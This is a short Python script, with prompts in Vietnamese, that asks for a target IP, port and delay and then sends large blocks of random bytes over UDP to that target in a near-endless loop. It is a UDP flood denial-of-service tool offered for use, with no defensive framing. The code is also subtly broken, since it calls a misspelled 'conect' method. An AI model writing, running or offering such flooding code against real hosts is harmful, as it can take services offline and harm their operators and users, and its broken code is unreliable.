import socket, random, time 



s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Ip mục tiêu:")
port = int(input("Cổng của mục tiêu:"))
sleep = float(input("Thời gian nghĩ giữa các gói:"))

s.conect((ip,port))

for i in range (1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Request: {i}", end='\r')
    time.sleep(sleep)